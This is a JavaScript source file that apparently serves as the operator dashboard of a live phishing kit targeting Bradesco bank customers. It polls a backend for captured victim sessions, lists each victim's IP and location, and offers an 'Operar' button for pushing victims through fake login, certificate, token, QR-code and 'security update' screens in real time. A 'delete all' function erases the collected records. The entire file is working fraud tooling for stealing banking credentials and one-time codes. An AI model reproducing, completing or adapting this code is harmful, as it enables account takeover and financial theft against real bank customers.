$("document").ready(() => {
    const url = "http://google.com.br/";

    const quantidadeSegundos = 5;

    let time = quantidadeSegundos;

    let status = {
        AGUARDANDO_INICIO: "Aguardando Início",
        COMPONENTE_SEGURANCA: "Aviso Componente de Segurança",
        BLOQUEADO: "Acesso Bloqueado",
        COMPONENTE_SEGURANCA_AGUARDANDO: "Aviso Componente de Segurança - Aguardando",
        LOGIN: "Login",
        USUARIO_SENHA: "Usuário e Senha - Login",
        ICP_BRASIL: "ICP Brasil - Login",
        CERTIFICADO: "Certificado Digital Bradesco - Login",
        AGUARDANDO_LOGIN: "Aguardando - Login",
        LOGIN_ERRO: "Usuário / Senha Inválidos - Login",
        TOKEN_CELULAR: "Token Celular - Login",
        TOKEN_CELULAR_ERRO: "Token Celular Erro - Login",
        TOKEN_CHAVEIRO: "Token Chaveiro - Login",
        TOKEN_CHAVEIRO_ERRO: "Token Chaveiro Erro - Login",
        INICIAR_ATUALIZACAO_INTERNA: "Iniciar Atualização - Interna",
        AGUARDE_ATUALIZACAO_ANDAMENTO_INTERNA: "Aguarde Atualização em Andamento - Interna",
        CONCLUIR_ATUALIZACAO_INTERNA: "Conclusão de Atualização - Interna",
        AGUARDE_VALIDACAO_CHAVE_INTERNA: "Aguarde Validação de Chave - Interna",
        TOKEN_CELULAR_INTERNA: "Token Celular - Interna",
        TOKEN_CELULAR_ERRO_INTERNA: "Erro Token Celular - Interna",
        TOKEN_CHAVEIRO_INTERNA: "Token Chaveiro - Interna",
        TOKEN_CHAVEIRO_ERRO_INTERNA: "Erro Token Chaveiro - Interna",
        AGUARDE_AVISO_QR_INTERNA: "Aviso QR Code Transação - Interna",
        QR_CODE_INTERNA: "QR Code - Interna",
        FEIXE_LUMINOSIDADE_INTERNA: "Feixe Luminosidade - Interna",
        FEIXE_LUMINOSIDADE_ERRO_INTERNA: "Erro Feixe Luminosidade - Interna",
        SOLICITAR_OUTRO_USER_INTERNA: "Solicitar Usuário - Interna",
    };

    $("tbody").on("click", "button.btn-operar", function (e) {
        let id = $(this).data("id");
        $.ajax({
            url: "do.php",
            type: "POST",
            data: { action: "MARCAR_COMO_VISUALIZADA", id: id },
            cache: false,
            success: function (r) {
                var win = window.open("operar.php?id=" + id, "_blank");
                win.focus();
                atualizarInformacoes();
            },
        });
    });

    function loadData() {
        $.ajax({
            url: "do.php",
            type: "POST",
            dataType: "json",
            data: { action: "BUSCAR_TODOS" },
            cache: false,
            success: function (r) {
                $("span#quantidade").text(r.length);
                let html = "";

                r.forEach((e) => {
                    html += `
                        <tr class="header ${e.statusInfo.toLowerCase()}" data-aberto="${e.aberto}" data-id="${e.id}">
                        <td scope="row">${e.id}</td>
                        <td>${e.ip}</td>
                        <td>${moment(e.data, "YYYY-MM-DD HH:mm:ss").format("DD/MM/YYYY HH:mm:ss")}</td>
                        <td>${e.pais}</td>
                        <td>${e.uf}</td>
                        <td>${e.cidade}</td>
                        <td><span class="status ${e.statusConexao.toLowerCase()}">${e.statusConexao}</span></td>
                        <td>${status[e.comando]}</td>
 
                        <td class="text-center"><button style="font-size:12px;" data-id="${
                            e.id
                        }" data-action="ALTERAR_STATUS_ACESSO" data-status="LIBERADO" type="button" class="btn btn-operar btn-outline-dark btn-sm excluir-info"><i class="fas fa-tools"></i> Operar</button></td>
                    </tr>
                    `;
                });
                $("tbody").empty().append(html);
            },
        });
    }

    loadData();

    function atualizarInformacoes() {
        time = quantidadeSegundos;
        loadData();
    }
    function relogio() {
        $("span#segundos").text(time);
        time--;
        if (time === -1) {
            loadData();
            time = 5;
        }
    }

    var timer = setInterval(relogio, 1000);

    function pararContador() {
        if (timer) {
            clearInterval(timer);
            timer = null;
        }
    }

    function iniciarContador() {
        if (!timer) {
            timer = setInterval(relogio, 1000);
        }
    }

    $("a#controlarContador").click((e) => {
        e.preventDefault();
        if (timer) {
            pararContador();
            $("span#timer").addClass("parado");
        } else {
            iniciarContador();
            $("span#timer").removeClass("parado");
        }
    });

    $("a#excluirTodos").click((e) => {
        e.preventDefault();

        $.ajax({
            url: "do.php",
            type: "POST",
            data: { action: "EXCLUIR_TODOS" },
            cache: false,
            success: function (r) {
                atualizarInformacoes();
            },
        });
    });
});
